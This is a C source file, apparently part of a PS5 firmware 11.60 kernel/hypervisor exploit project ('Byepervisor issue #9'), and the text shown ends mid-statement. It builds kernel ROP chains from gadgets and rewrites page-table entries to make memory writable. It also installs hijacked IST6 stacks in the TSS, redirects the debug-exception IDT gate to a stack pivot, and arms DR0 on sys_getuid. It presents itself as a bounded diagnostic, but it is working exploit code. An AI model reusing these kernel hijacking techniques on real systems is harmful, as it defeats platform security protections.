#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <sys/syscall.h>
#include <unistd.h>

#include <ps5/kernel.h>

#include "issue9_diag.h"
#include "kdlsym.h"
#include "khook.h"
#include "paging.h"
#include "util.h"

#define ISSUE9_NCPU              16
#define ISSUE9_TSS_STRIDE        0x68ULL
#define ISSUE9_STACKS_OFF        0x1000ULL
#define ISSUE9_STACK_STRIDE      0x100ULL
#define ISSUE9_IRET_OFF          0x20ULL
#define ISSUE9_FRAME_OFF         0x28ULL
#define ISSUE9_TOP_OFF           0x50ULL
#define ISSUE9_SAVE_OFF          0x3000ULL
#define ISSUE9_RESULT_OFF        0x700ULL
#define PRODUCTION_STATE_OFF     0x600ULL

#define ISSUE9_STATE_ARMED       0x4939444241524D44ULL /* "I9DBARMD" */
#define ISSUE9_CPU_MARKER        0x4939444200000000ULL /* "I9DB" + cpu */

#define S_STATE                  0x00
#define S_GATE_LO                0x08
#define S_GATE_HI                0x10
#define S_ISTS                   0x18

typedef struct {
  uint64_t addr;
  uint64_t original;
} issue9_page_patch_t;

_Static_assert((ISSUE9_TOP_OFF & 0xf) == 0,
               "IST stack top must be 16-byte aligned");
_Static_assert(ISSUE9_FRAME_OFF + 0x28 == ISSUE9_TOP_OFF,
               "five-qword privilege frame must end at the IST top");
_Static_assert(ISSUE9_IRET_OFF + 8 == ISSUE9_FRAME_OFF,
               "IRET trampoline must immediately precede the frame");

static uint64_t tss_ist_slot(uint64_t tss_base, int cpu, int ist)
{
  return tss_base + (uint64_t)cpu * ISSUE9_TSS_STRIDE + KH_TSS_IST(ist);
}

static void gate_encode(uint64_t off, uint16_t sel, uint8_t ist,
                        uint64_t *lo, uint64_t *hi)
{
  *lo = (off & 0xffffULL)
      | ((uint64_t)sel << 16)
      | ((uint64_t)(ist & 7) << 32)
      | ((uint64_t)KH_GATE_INTERRUPT << 40)
      | (1ULL << 47)
      | (((off >> 16) & 0xffffULL) << 48);
  *hi = (off >> 32) & 0xffffffffULL;
}

static int chain_q(uint8_t *segment, size_t *off, uint64_t value)
{
  if (*off + sizeof value > ISSUE9_STACK_STRIDE)
    return -1;
  memcpy(segment + *off, &value, sizeof value);
  *off += sizeof value;
  return 0;
}

static int chain_store(uint8_t *segment, size_t *off,
                       uint64_t target, uint64_t value)
{
  return chain_q(segment, off, kgadget(KERNEL_GADGET_POP_RDI)) ||
         chain_q(segment, off, target - 8) ||
         chain_q(segment, off, kgadget(KERNEL_GADGET_POP_RCX)) ||
         chain_q(segment, off, value) ||
         chain_q(segment, off, kgadget(KERNEL_GADGET_STORE_RDI8_RCX));
}

static int build_cpu_stack(uint8_t *segment, uint64_t segment_va, int cpu,
                           uint64_t db_gate, uint64_t saved_gate_lo,
                           uint64_t result)
{
  uint64_t frame = segment_va + ISSUE9_FRAME_OFF;
  uint64_t trampoline = segment_va + ISSUE9_IRET_OFF;
  size_t off = ISSUE9_TOP_OFF;

  memset(segment, 0, ISSUE9_STACK_STRIDE);

  /* The final POP_RSP returns through this IRETQ into the hardware frame. */
  memcpy(segment + ISSUE9_IRET_OFF,
         &(uint64_t){kgadget(KERNEL_GADGET_IRETQ)}, sizeof(uint64_t));

  /* This must remain the first ROP operation after the entry pivot. */
  if (chain_store(segment, &off, db_gate, saved_gate_lo))
    return -1;

  if (chain_store(segment, &off, result + (uint64_t)cpu * 8,
                  ISSUE9_CPU_MARKER | (uint64_t)cpu))
    return -1;

  /* The diagnostic intentionally traps from its own user-mode NOP. */
  if (chain_q(segment, &off, kgadget(KERNEL_GADGET_POP_RCX)) ||
      chain_q(segment, &off, frame + 0x10) ||
      chain_q(segment, &off, kgadget(KERNEL_GADGET_POP_RAX)) ||
      chain_q(segment, &off, KH_RFLAGS_USER | KH_RF) ||
      chain_q(segment, &off, kgadget(KERNEL_GADGET_ST_RCX_RAX)) ||
      chain_q(segment, &off, kgadget(KERNEL_GADGET_POP_RSP)) ||
      chain_q(segment, &off, trampoline))
    return -1;

  return 0;
}

static int verify_tss_layout(uint64_t tss_base, uint64_t saved[ISSUE9_NCPU])
{
  uint64_t rsp0[ISSUE9_NCPU];
  uint64_t ist4[ISSUE9_NCPU];

  for (int cpu = 0; cpu < ISSUE9_NCPU; cpu++) {
    uint64_t base = tss_base + (uint64_t)cpu * ISSUE9_TSS_STRIDE;
    rsp0[cpu] = kread64(base + 0x04);
    ist4[cpu] = kread64(base + KH_TSS_IST(4));
    saved[cpu] = kread64(tss_ist_slot(tss_base, cpu, 6));

    if ((rsp0[cpu] >> 47) != 0x1ffffULL || ist4[cpu] == 0) {
      printf("[issue9] REFUSE: TSS[%d] invalid rsp0=%016lx ist4=%016lx\n",
             cpu, rsp0[cpu], ist4[cpu]);
      return -1;
    }
    if (saved[cpu] != 0) {
      printf("[issue9] REFUSE: TSS[%d].IST6 is already owned: %016lx\n",
             cpu, saved[cpu]);
      return -2;
    }
    for (int prior = 0; prior < cpu; prior++) {
      if (rsp0[cpu] == rsp0[prior] || ist4[cpu] == ist4[prior]) {
        printf("[issue9] REFUSE: TSS[%d] aliases TSS[%d]; stride is unproven\n",
               cpu, prior);
        return -3;
      }
    }
  }
  return 0;
}

static int restore_ists(uint64_t tss_base, const uint64_t saved[ISSUE9_NCPU])
{
  int bad = 0;

  for (int cpu = 0; cpu < ISSUE9_NCPU; cpu++)
    kwrite64(tss_ist_slot(tss_base, cpu, 6), saved[cpu]);
  for (int cpu = 0; cpu < ISSUE9_NCPU; cpu++)
    if (kread64(tss_ist_slot(tss_base, cpu, 6)) != saved[cpu])
      bad++;
  return bad;
}

static int patch_page_entry(issue9_page_patch_t *patches, int *count,
                            uint64_t addr, uint64_t original, uint64_t updated)
{
  for (int i = 0; i < *count; i++)
    if (patches[i].addr == addr)
      return 0;
  if (*count >= 8)
    return -1;

  patches[*count].addr = addr;
  patches[*count].original = original;
  (*count)++;
  kwrite64(addr, updated);
  return kread64(addr) == updated ? 0 : -1;
}

static int make_cave_writable(uint64_t cave, issue9_page_patch_t *patches,
                              int *count)
{
  uint64_t pmap = kdlsym(KERNEL_SYM_PMAP_STORE);

  for (uint64_t va = cave; va < cave + 0x4000; va += 0x1000) {
    uint64_t addr, entry, updated;

    addr = find_pde(pmap, va, &entry);
    if (addr == 0xffffffffffffffffULL)
      return -1;
    if (!PDE_FIELD(entry, PRESENT))
      return -1;
    updated = entry;
    CLEAR_PDE_BIT(updated, XOTEXT);
    SET_PDE_BIT(updated, RW);
    if (updated != entry && patch_page_entry(patches, count, addr, entry, updated))
      return -1;
    if (PDE_FIELD(entry, PS))
      continue;

    addr = find_pte(pmap, va, &entry);
    if (addr == 0xffffffffffffffffULL)
      return -1;
    if (!PDE_FIELD(entry, PRESENT))
      return -1;
    updated = entry;
    CLEAR_PDE_BIT(updated, XOTEXT);
    SET_PDE_BIT(updated, RW);
    if (updated != entry && patch_page_entry(patches, count, addr, entry, updated))
      return -1;
  }
  return 0;
}

static int restore_page_entries(const issue9_page_patch_t *patches, int count)
{
  int bad = 0;

  for (int i = count - 1; i >= 0; i--)
    kwrite64(patches[i].addr, patches[i].original);
  for (int i = 0; i < count; i++)
    if (kread64(patches[i].addr) != patches[i].original)
      bad++;
  return bad;
}

__attribute__((noinline))
static void publish_and_single_step(uint64_t db_gate, uint64_t gate_lo)
{
  /* No logging, allocation, or kernel reads are permitted after this write. */
  kwrite64(db_gate, gate_lo);
  __asm__ volatile(
      "pushfq             \n\t"
      "orq $0x100, (%%rsp)\n\t"
      "popfq              \n\t"
      "nop                \n\t"
      ::: "memory", "cc");
}

int issue9_diag_run(uint64_t cave)
{
  uint64_t idt_base = kdlsym(KERNEL_SYM_IDT_ARRAY);
  uint64_t tss_base = kdlsym(KERNEL_SYM_COMMON_TSS);
  uint64_t db_gate = idt_base + 16 * KH_VEC_DB;
  uint64_t result = cave + ISSUE9_RESULT_OFF;
  uint64_t save = cave + ISSUE9_SAVE_OFF;
  uint64_t saved_gate_lo, saved_gate_hi, gate_lo, gate_hi;
  uint64_t saved_ist[ISSUE9_NCPU];
  issue9_page_patch_t page_patches[8];
  uint8_t stacks[0x1000];
  uint8_t verify[0x1000];
  uint16_t kcs;
  int rc, bad = 0, page_patch_count = 0, handled_cpu = -1, marker_count = 0;

  printf("[issue9] bounded 11.60 #DB/IST6 diagnostic\n");
  printf("[issue9] no DR0, no resume hook, no hypervisor payload\n");

  if ((kernel_get_fw_version() & 0xffff0000U) != 0x11600000U) {
    printf("[issue9] REFUSE: this diagnostic is 11.60-only\n");
    return 1;
  }
  if (kread64(save + S_STATE) == ISSUE9_STATE_ARMED) {
    printf("[issue9] REFUSE: previous diagnostic state is still marked armed\n");
    printf("[issue9] power-cycle before another run\n");
    return 3;
  }
  if (kread64(cave + PRODUCTION_STATE_OFF) != 0) {
    printf("[issue9] REFUSE: production hook state is nonzero\n");
    printf("[issue9] use a fresh boot and load only this diagnostic\n");
    return 3;
  }

  saved_gate_lo = kread64(db_gate);
  saved_gate_hi = kread64(db_gate + 8);
  kcs = (uint16_t)(saved_gate_lo >> 16);
  if (!kcs || !((saved_gate_lo >> 47) & 1)) {
    printf("[issue9] REFUSE: vector 1 gate is not a present kernel gate\n");
    return 4;
  }
  if (((saved_gate_lo >> 32) & 7) != 4) {
    printf("[issue9] REFUSE: stock vector 1 does not use expected IST4\n");
    return 4;
  }
  {
    uint64_t handler = (saved_gate_lo & 0xffffULL)
                     | (((saved_gate_lo >> 48) & 0xffffULL) << 16)
                     | ((saved_gate_hi & 0xffffffffULL) << 32);
    if (handler < ktext(0) || handler >= ktext(0) + KH_KIMG_MAX) {
      printf("[issue9] REFUSE: stock vector 1 handler is outside ktext\n");
      return 4;
    }
  }

  printf("[issue9] stock gate lo=%016lx hi=%016lx ist=%lu\n",
         saved_gate_lo, saved_gate_hi, (saved_gate_lo >> 32) & 7);
  rc = verify_tss_layout(tss_base, saved_ist);
  if (rc) return 5;
  printf("[issue9] TSS census passed: 16 distinct rsp0/IST4 pairs, IST6 free\n");

  gate_encode(kgadget(KERNEL_GADGET_PIVOT_ADD_RSP28_RET), kcs, 6,
              &gate_lo, &gate_hi);
  if (gate_hi != saved_gate_hi) {
    printf("[issue9] REFUSE: gate high qword would change\n");
    return 6;
  }

  memset(page_patches, 0, sizeof page_patches);
  if (make_cave_writable(cave, page_patches, &page_patch_count)) {
    printf("[issue9] REFUSE: could not make the cave data pages writable\n");
    restore_page_entries(page_patches, page_patch_count);
    return 8;
  }
  printf("[issue9] cave data access prepared with %d page-table change(s); NX retained\n",
         page_patch_count);

  memset(stacks, 0, sizeof stacks);
  for (int cpu = 0; cpu < ISSUE9_NCPU; cpu++) {
    uint64_t segment_va = cave + ISSUE9_STACKS_OFF
                        + (uint64_t)cpu * ISSUE9_STACK_STRIDE;
    if (build_cpu_stack(stacks + (size_t)cpu * ISSUE9_STACK_STRIDE,
                        segment_va, cpu, db_gate, saved_gate_lo, result)) {
      printf("[issue9] REFUSE: CPU %d one-shot chain exceeds its segment\n", cpu);
      restore_page_entries(page_patches, page_patch_count);
      return 9;
    }
    kwrite64(result + (uint64_t)cpu * 8, 0);
  }
  kwrite(cave + ISSUE9_STACKS_OFF, stacks, sizeof stacks);
  memset(verify, 0, sizeof verify);
  kread(cave + ISSUE9_STACKS_OFF, verify, sizeof verify);
  if (memcmp(stacks, verify, sizeof stacks) != 0) {
    printf("[issue9] REFUSE: per-core ROP stack readback mismatch\n");
    restore_page_entries(page_patches, page_patch_count);
    return 9;
  }

  kwrite64(save + S_GATE_LO, saved_gate_lo);
  kwrite64(save + S_GATE_HI, saved_gate_hi);
  for (int cpu = 0; cpu < ISSUE9_NCPU; cpu++)
    kwrite64(save + S_ISTS + (uint64_t)cpu * 8, saved_ist[cpu]);
  kwrite64(save + S_STATE, ISSUE9_STATE_ARMED);

  for (int cpu = 0; cpu < ISSUE9_NCPU; cpu++) {
    uint64_t top = cave + ISSUE9_STACKS_OFF
                 + (uint64_t)cpu * ISSUE9_STACK_STRIDE + ISSUE9_TOP_OFF;
    kwrite64(tss_ist_slot(tss_base, cpu, 6), top);
  }
  for (int cpu = 0; cpu < ISSUE9_NCPU; cpu++) {
    uint64_t top = cave + ISSUE9_STACKS_OFF
                 + (uint64_t)cpu * ISSUE9_STACK_STRIDE + ISSUE9_TOP_OFF;
    if (kread64(tss_ist_slot(tss_base, cpu, 6)) != top)
      bad++;
  }
  if (bad) {
    printf("[issue9] REFUSE: %d IST6 publish readback failures\n", bad);
    restore_ists(tss_base, saved_ist);
    kwrite64(save + S_STATE, 0);
    restore_page_entries(page_patches, page_patch_count);
    return 10;
  }

  printf("[issue9] 16 isolated IST6 ROP stacks verified\n");
  printf("[issue9] publishing gate last, then immediate TF\n");
  publish_and_single_step(db_gate, gate_lo);

  /* The handler must already have restored the gate.  Force it stock before IST cleanup
     even when the result is malformed; gate-first teardown is non-negotiable. */
  if (kread64(db_gate) != saved_gate_lo)
    kwrite64(db_gate, saved_gate_lo);
  bad = restore_ists(tss_base, saved_ist);

  if (kread64(db_gate) != saved_gate_lo ||
      kread64(db_gate + 8) != saved_gate_hi || bad) {
    printf("[issue9] FAIL: teardown incomplete gate=%016lx/%016lx ist_bad=%d\n",
           kread64(db_gate), kread64(db_gate + 8), bad);
    printf("[issue9] cave mapping left writable for emergency recovery; power-cycle\n");
    return 11;
  }
  kwrite64(save + S_STATE, 0);

  {
    uint64_t frame = 0, rip = 0;
    uint64_t cs = 0, rflags = 0, user_rsp = 0, ss = 0;

    for (int cpu = 0; cpu < ISSUE9_NCPU; cpu++) {
      uint64_t marker = kread64(result + (uint64_t)cpu * 8);
      if (marker == (ISSUE9_CPU_MARKER | (uint64_t)cpu)) {
        handled_cpu = cpu;
        marker_count++;
      }
    }
    if (handled_cpu >= 0) {
      frame = cave + ISSUE9_STACKS_OFF
            + (uint64_t)handled_cpu * ISSUE9_STACK_STRIDE + ISSUE9_FRAME_OFF;
      rip = kread64(frame + 0x00);
      cs = kread64(frame + 0x08);
      rflags = kread64(frame + 0x10);
      user_rsp = kread64(frame + 0x18);
      ss = kread64(frame + 0x20);
    }

    printf("[issue9] handled markers=%d tss_index=%d\n",
           marker_count, handled_cpu);
    printf("[issue9] frame=%016lx rip=%016lx cs=%lx rflags=%016lx\n",
           frame, rip, cs, rflags);
    printf("[issue9] user_rsp=%016lx ss=%lx\n", user_rsp, ss);
    printf("[issue9] teardown verified: stock gate and all 16 IST6 restored\n");

    if (marker_count != 1 || handled_cpu < 0 || cs != KH_USER_CS ||
        ss != KH_USER_SS || rflags != (KH_RFLAGS_USER | KH_RF)) {
      printf("[issue9] FAIL: trap provenance is not the intended single-step\n");
      bad = 1;
    }
  }

  rc = restore_page_entries(page_patches, page_patch_count);
  printf("[issue9] cave page-table restore: %s\n", rc ? "FAILED" : "ok");
  if (rc)
    return 12;
  if (bad)
    return 13;

  printf("[issue9] PASS: bounded TF path completed cleanly\n");
  notifyf("Byepervisor issue #9 diagnostic PASS\nGate stock, 16/16 IST6 restored");
  return 0;
}

/* A bounded follow-up to issue9_diag_run().  This exercises the exact DR0 arm
 * path used by the resume hook, but immediately triggers a known instruction in
 * sys_getuid and tears everything down before returning to the caller. */
#define DR0_ARM_OFF             0x1000ULL
#define DR0_ARM_CTX_OFF         0x100ULL
#define DR0_ARM_CONT_OFF        0x200ULL
#define DR0_FALLBACKS_OFF       0x1400ULL
#define DR0_HANDLER_OFF         0x2400ULL
#define DR0_BLOCK_SIZE          0x100ULL
#define DR0_RESULT_OFF          0x800ULL
#define DR0_SELECTED_CPU        0
#define DR0_STATE_ARMED         0x493944523041524DULL /* "I9DR0ARM" */
#define DR0_HIT_MARKER          0x4939445230484954ULL /* "I9DR0HIT" */
#define DR0_FOREIGN_MARKER      0x49394452464F0000ULL /* "I9DRFO" + cpu */

_Static_assert(DR0_ARM_OFF + 0x400 <= DR0_FALLBACKS_OFF,
               "DR0 arm block overlaps fallbacks");
_Static_assert(DR0_FALLBACKS_OFF + 15 * DR0_BLOCK_SIZE <= DR0_HANDLER_OFF,
               "DR0 fallback blocks overlap handler");
_Static_assert(DR0_HANDLER_OFF + 0x400 <= ISSUE9_SAVE_OFF,
               "DR0 handler overlaps saved recovery state");

static int dr0_chain_q(uint8_t *buf, size_t *off, size_t cap, uint64_t value)
{
  if (*off + sizeof value > cap)
    return -1;
  memcpy(buf + *off, &value, sizeof value);
  *off += sizeof value;
  return 0;
}

static int dr0_chain_store(uint8_t *buf, size_t *off, size_t cap,
                           uint64_t target, uint64_t value)
{
  return dr0_chain_q(buf, off, cap, kgadget(KERNEL_GADGET_POP_RDI)) ||
         dr0_chain_q(buf, off, cap, target - 8) ||
         dr0_chain_q(buf, off, cap, kgadget(KERNEL_GADGET_POP_RCX)) ||
         dr0_chain_q(buf, off, cap, value) ||
         dr0_chain_q(buf, off, cap,
                     kgadget(KERNEL_GADGET_STORE_RDI8_RCX));
}

static int build_cancel_stack(uint8_t *segment, uint64_t segment_va, int cpu,
                              uint64_t db_gate, uint64_t saved_gate_lo,
                              uint64_t result)
{
  uint64_t frame = segment_va + ISSUE9_FRAME_OFF;
  uint64_t trampoline = segment_va + ISSUE9_IRET_OFF;
  size_t off = ISSUE9_TOP_OFF;

  memset(segment, 0, DR0_BLOCK_SIZE);
  memcpy(segment + ISSUE9_IRET_OFF,
         &(uint64_t){kgadget(KERNEL_GADGET_IRETQ)}, sizeof(uint64_t));

  if (chain_store(segment, &off, db_gate, saved_gate_lo) ||
      chain_store(segment, &off, result + (uint64_t)cpu * 8,
                  DR0_FOREIGN_MARKER | (uint64_t)cpu) ||
      chain_q(segment, &off, kgadget(KERNEL_GADGET_POP_RCX)) ||
      chain_q(segment, &off, frame + 0x10) ||
      chain_q(segment, &off, kgadget(KERNEL_GADGET_POP_RAX)) ||
      chain_q(segment, &off, KH_RFLAGS_USER | KH_RF) ||
      chain_q(segment, &off, kgadget(KERNEL_GADGET_ST_RCX_RAX)) ||
      chain_q(segment, &off, kgadget(KERNEL_GADGET_POP_RSP)) ||
      chain_q(segment, &off, trampoline))
    return -1;
  return 0;
}

static int build_dr0_arm(uint8_t *arm, uint64_t arm_va, uint64_t hook_target,
                         uint64_t selected_ist, uint64_t handler_top)
{
  uint64_t ctx = arm_va + DR0_ARM_CTX_OFF;
  uint64_t cont = arm_va + DR0_ARM_CONT_OFF;
  size_t off = ISSUE9_TOP_OFF;

  memset(arm, 0, 0x400);
  if (dr0_chain_q(arm, &off, 0x400, kgadget(KERNEL_GADGET_POP_RAX)) ||
      dr0_chain_q(arm, &off, 0x400, hook_target) ||
      dr0_chain_q(arm, &off, 0x400, kgadget(KERNEL_GADGET_POP_RDI)) ||
      dr0_chain_q(arm, &off, 0x400, ctx) ||
      dr0_chain_q(arm, &off, 0x400,
                  kgadget(KERNEL_GADGET_DBREG_RESUME)))
    return -1;
  if (off > DR0_ARM_CTX_OFF)
    return -1;

  memcpy(arm + DR0_ARM_CTX_OFF + KH_RC_RSP,
         &(uint64_t){cont - 8}, sizeof(uint64_t));
  memcpy(arm + DR0_ARM_CTX_OFF + KH_RC_RIP,
         &(uint64_t){kgadget(KERNEL_GADGET_RET_TRAMP)}, sizeof(uint64_t));
  memcpy(arm + DR0_ARM_CTX_OFF + KH_RC_DR7,
         &(uint64_t){KH_DR7_BP0_EXEC}, sizeof(uint64_t));

  off = DR0_ARM_CONT_OFF;
  if (dr0_chain_q(arm, &off, 0x400, kgadget(KERNEL_GADGET_POP_RDI)) ||
      dr0_chain_q(arm, &off, 0x400, selected_ist - 8) ||
      dr0_chain_q(arm, &off, 0x400, kgadget(KERNEL_GADGET_POP_RCX)) ||
      dr0_chain_q(arm, &off, 0x400, handler_top) ||
      dr0_chain_q(arm, &off, 0x400,
                  kgadget(KERNEL_GADGET_STORE_RDI8_RCX)) ||
      dr0_chain_q(arm, &off, 0x400, kgadget(KERNEL_GADGET_IRETQ)))
    return -1;

  /* Five-qword user return frame, filled by arm_dr0_and_return(). */
  off += 5 * sizeof(uint64_t);
  return off <= 0x400 ? 0 : -1;
}

static int build_dr0_handler(uint8_t *handler, uint64_t handler_va,
                             uint64_t db_gate, uint64_t saved_gate_lo,
                             uint64_t result)
{
  uint64_t frame = handler_va + ISSUE9_FRAME_OFF;
  uint64_t trampoline = handler_va + ISSUE9_IRET_OFF;
  size_t off = ISSUE9_TOP_OFF;

  memset(handler, 0, 0x400);
  memcpy(handler + ISSUE9_IRET_OFF,
         &(uint64_t){kgadget(KERNEL_GADGET_IRETQ)}, sizeof(uint64_t));

  /* Gate restoration is the first mutation.  The selected target resumes at
   * xor eax,eax, so this chain may freely clobber caller-saved registers. */
  if (dr0_chain_store(handler, &off, 0x400, db_gate, saved_gate_lo) ||
      dr0_chain_store(handler, &off, 0x400, result, DR0_HIT_MARKER) ||
      dr0_chain_q(handler, &off, 0x400, kgadget(KERNEL_GADGET_POP_RAX)) ||
      dr0_chain_q(handler, &off, 0x400, 0) ||
      dr0_chain_q(handler, &off, 0x400,
                  kgadget(KERNEL_GADGET_SET_DR7)) ||
      dr0_chain_q(handler, &off, 0x400, kgadget(KERNEL_GADGET_POP_RCX)) ||
      dr0_chain_q(handler, &off, 0x400, frame + 0x10) ||
      dr0_chain_q(handler, &off, 0x400, kgadget(KERNEL_GADGET_POP_RAX)) ||
      dr0_chain_q(handler, &off, 0x400, KH_RFLAGS_USER | KH_RF) ||
      dr0_chain_q(handler, &off, 0x400,
                  kgadget(KERNEL_GADGET_ST_RCX_RAX)) ||
      dr0_chain_q(handler, &off, 0x400, kgadget(KERNEL_GADGET_POP_RSP)) ||
      dr0_chain_q(handler, &off, 0x400, trampoline))
    return -1;
  return off <= 0x400 ? 0 : -1;
}

__attribute__((noinline))
static void arm_dr0_and_return(uint64_t db_gate, uint64_t gate_lo,
                               uint64_t arm_ctx, uint64_t return_frame)
{
  uint64_t rsp, rbx, rbp, r12, r13, r14, r15;
  void *resume_label = &&resumed;

  __asm__ volatile("mov %%rsp,%0" : "=r"(rsp));
  __asm__ volatile("mov %%rbx,%0" : "=r"(rbx));
  __asm__ volatile("mov %%rbp,%0" : "=r"(rbp));
  __asm__ volatile("mov %%r12,%0" : "=r"(r12));
  __asm__ volatile("mov %%r13,%0" : "=r"(r13));
  __asm__ volatile("mov %%r14,%0" : "=r"(r14));
  __asm__ volatile("mov %%r15,%0" : "=r"(r15));

  kwrite64(arm_ctx + 0x00, r15);
  kwrite64(arm_ctx + 0x08, r14);
  kwrite64(arm_ctx + 0x10, r13);
  kwrite64(arm_ctx + 0x18, r12);
  kwrite64(arm_ctx + KH_RC_RBP, rbp);
  kwrite64(arm_ctx + KH_RC_RSP, return_frame - 7 * sizeof(uint64_t));
  kwrite64(arm_ctx + 0x30, rbx);
  kwrite64(arm_ctx + KH_RC_RIP, kgadget(KERNEL_GADGET_RET_TRAMP));

  kwrite64(return_frame + 0x00, (uint64_t)resume_label);
  kwrite64(return_frame + 0x08, KH_USER_CS);
  kwrite64(return_frame + 0x10, KH_RFLAGS_USER);
  kwrite64(return_frame + 0x18, rsp);
  kwrite64(return_frame + 0x20, KH_USER_SS);

  /* Publish last and trigger the already-proven TF delivery immediately. */
  kwrite64(db_gate, gate_lo);
  __asm__ volatile(
      "pushfq             \n\t"
      "orq $0x100, (%%rsp)\n\t"
      "popfq              \n\t"
      "nop                \n\t"
      ::: "memory", "cc");
resumed:
  return;
}

__attribute__((noinline))
static void cleanup_single_step(void)
{
  __asm__ volatile(
      "pushfq             \n\t"
      "orq $0x100, (%%rsp)\n\t"
      "popfq              \n\t"
      "nop                \n\t"
      ::: "memory", "cc");
}

int issue9_dr0_diag_run(uint64_t cave)
{
  uint64_t idt_base = kdlsym(KERNEL_SYM_IDT_ARRAY);
  uint64_t tss_base = kdlsym(KERNEL_SYM_COMMON_TSS);
  uint64_t db_gate = idt_base + 16 * KH_VEC_DB;
  uint64_t result = cave + DR0_RESULT_OFF;
  uint64_t save = cave + ISSUE9_SAVE_OFF;
  uint64_t arm_va = cave + DR0_ARM_OFF;
  uint64_t handler_va = cave + DR0_HANDLER_OFF;
  uint64_t handler_top = handler_va + ISSUE9_TOP_OFF;
  uint64_t hook_target = kdlsym(KERNEL_SYM_SYS_GETUID) + 0x15;
  uint64_t saved_gate_lo, saved_gate_hi, gate_lo, gate_hi;
  uint64_t saved_ist[ISSUE9_NCPU];
  issue9_page_patch_t page_patches[8];
  uint8_t arm[0x400], handler[0x400], fallback[DR0_BLOCK_SIZE];
  uint8_t verify[0x400];
  int page_patch_count = 0, rc, bad = 0, sysret;

  printf("[issue9-dr0] bounded 11.60 DR0 provenance diagnostic\n");
  printf("[issue9-dr0] no sleep, no resume strike, no hypervisor payload\n");

  if ((kernel_get_fw_version() & 0xffff0000U) != 0x11600000U)
    return 1;
  if (kread64(save + S_STATE) != 0 ||
      kread64(cave + PRODUCTION_STATE_OFF) != 0) {
    printf("[issue9-dr0] REFUSE: stale hook state; use a fresh boot\n");
    return 3;
  }

  saved_gate_lo = kread64(db_gate);
  saved_gate_hi = kread64(db_gate + 8);
  if (!((saved_gate_lo >> 47) & 1) ||
      ((saved_gate_lo >> 32) & 7) != 4) {
    printf("[issue9-dr0] REFUSE: stock vector 1 gate is unexpected\n");
    return 4;
  }
  if (verify_tss_layout(tss_base, saved_ist))
    return 5;
  gate_encode(kgadget(KERNEL_GADGET_PIVOT_ADD_RSP28_RET),
              (uint16_t)(saved_gate_lo >> 16), 6, &gate_lo, &gate_hi);
  if (gate_hi != saved_gate_hi)
    return 6;

  memset(page_patches, 0, sizeof page_patches);
  if (make_cave_writable(cave, page_patches, &page_patch_count)) {
    restore_page_entries(page_patches, page_patch_count);
    return 8;
  }

  if (build_dr0_arm(arm, arm_va, hook_target,
                    tss_ist_slot(tss_base, DR0_SELECTED_CPU, 6),
                    handler_top) ||
      build_dr0_handler(handler, handler_va, db_gate, saved_gate_lo, result)) {
    restore_page_entries(page_patches, page_patch_count);
    return 9;
  }
  kwrite(arm_va, arm, sizeof arm);
  memset(verify, 0, sizeof verify);
  kread(arm_va, verify, sizeof arm);
  if (memcmp(verify, arm, sizeof arm) != 0) {
    printf("[issue9-dr0] REFUSE: arm block readback mismatch\n");
    restore_page_entries(page_patches, page_patch_count);
    return 9;
  }
  kwrite(handler_va, handler, sizeof handler);
  memset(verify, 0, sizeof verify);
  kread(handler_va, verify, sizeof handler);
  if (memcmp(verify, handler, sizeof handler) != 0) {
    printf("[issue9-dr0] REFUSE: handler block readback mismatch\n");
    restore_page_entries(page_patches, page_patch_count);
    return 9;
  }
  for (int cpu = 1; cpu < ISSUE9_NCPU; cpu++) {
    uint64_t va = cave + DR0_FALLBACKS_OFF + (uint64_t)(cpu - 1) * DR0_BLOCK_SIZE;
    if (build_cancel_stack(fallback, va, cpu, db_gate, saved_gate_lo, result)) {
      restore_page_entries(page_patches, page_patch_count);
      return 9;
    }
    kwrite(va, fallback, sizeof fallback);
    memset(verify, 0, DR0_BLOCK_SIZE);
    kread(va, verify, DR0_BLOCK_SIZE);
    if (memcmp(verify, fallback, DR0_BLOCK_SIZE) != 0) {
      printf("[issue9-dr0] REFUSE: CPU %d fallback readback mismatch\n", cpu);
      restore_page_entries(page_patches, page_patch_count);
      return 9;
    }
  }
  for (int cpu = 0; cpu < ISSUE9_NCPU; cpu++)
    kwrite64(result + (uint64_t)cpu * 8, 0);

  kwrite64(save + S_GATE_LO, saved_gate_lo);
  kwrite64(save + S_GATE_HI, saved_gate_hi);
  for (int cpu = 0; cpu < ISSUE9_NCPU; cpu++)
    kwrite64(save + S_ISTS + (uint64_t)cpu * 8, saved_ist[cpu]);
  kwrite64(save + S_STATE, DR0_STATE_ARMED);
  if (kread64(save + S_STATE) != DR0_STATE_ARMED) {
    printf("[issue9-dr0] REFUSE: recovery state readback failed\n");
    restore_page_entries(page_patches, page_patch_count);
    return 9;
  }

  kwrite64(tss_ist_slot(tss_base, 0, 6), arm_va + ISSUE9_TOP_OFF);
  for (int cpu = 1; cpu < ISSUE9_NCPU; cpu++) {
    uint64_t top = cave + DR0_FALLBACKS_OFF
                 + (uint64_t)(cpu - 1) * DR0_BLOCK_SIZE + ISSUE9_TOP_OFF;
    kwrite64(tss_ist_slot(tss_base, cpu, 6), top);
  }
  for (int cpu = 0; cpu < ISSUE9_NCPU; cpu++) {
    uint64_t want = cpu == 0
                  ? arm_va + ISSUE9_TOP_OFF
                  : cave + DR0_FALLBACKS_OFF
                    + (uint64_t)(cpu - 1) * DR0_BLOCK_SIZE + ISSUE9_TOP_OFF;
    if (kread64(tss_ist_slot(tss_base, cpu, 6)) != want)
      bad++;
  }
  if (bad) {
    printf("[issue9-dr0] REFUSE: %d IST6 publish failures\n", bad);
    restore_ists(tss_base, saved_ist);
    kwrite64(save + S_STATE, 0);
    restore_page_entries(page_patches, page_patch_count);
    return 10;
  }

  printf("[issue9-dr0] 16 isolated paths published; arming DR0 briefly\n");
  arm_dr0_and_return(db_gate, gate_lo,
                     arm_va + DR0_ARM_CTX_OFF,
                     arm_va + DR0_ARM_CONT_OFF + 6 * sizeof(uint64_t));

  /* No work is inserted between arming and the intended syscall. */
  sysret = (int)syscall(SYS_getuid);

  /* If the expected breakpoint did not fire, the custom gate is still live.
   * Force the selected handler once with TF so it clears DR7 before teardown. */
  if (kread64(db_gate) != saved_gate_lo)
    cleanup_single_step();
  if (kread64(db_gate) != saved_gate_lo)
    kwrite64(db_gate, saved_gate_lo);
  bad = restore_ists(tss_base, saved_ist);
  kwrite64(save + S_STATE, 0);

  printf("[issue9-dr0] syscall ret=%d marker=%016lx\n",
         sysret, kread64(result));
  printf("[issue9-dr0] frame rip=%016lx cs=%lx rflags=%016lx\n",
         kread64(handler_va + ISSUE9_FRAME_OFF),
